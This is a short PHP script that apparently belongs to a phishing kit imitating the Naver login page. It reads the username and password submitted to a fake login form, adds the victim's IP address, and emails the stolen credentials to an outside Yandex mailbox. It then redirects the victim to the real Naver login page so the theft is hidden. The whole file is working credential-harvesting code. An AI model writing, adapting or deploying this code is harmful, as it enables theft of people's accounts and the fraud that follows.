<?php

$ip = getenv("REMOTE_ADDR");

$message .= "-----------  ! +Account infoS+ !  -----------\n";
$message .= "Username   : ".$_POST['id']."\n";
$message .= "Password   : ".$_POST['pw']."\n";
$message .= "IP Address : ".$ip."\n";
$message .= "-----------  !Thuglife_Legend+ !  -----------\n";
$send = "eazy.lion@yandex.com";

$subject = "makavelli ! xD $ip";
$headers = "From:  <info@notime>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
mail($send,$subject,$message,$headers);
    

header("Location: https://nid.naver.com/nidlogin.login?url=http%3A%2F%2Fmail.naver.com%2F");

?>


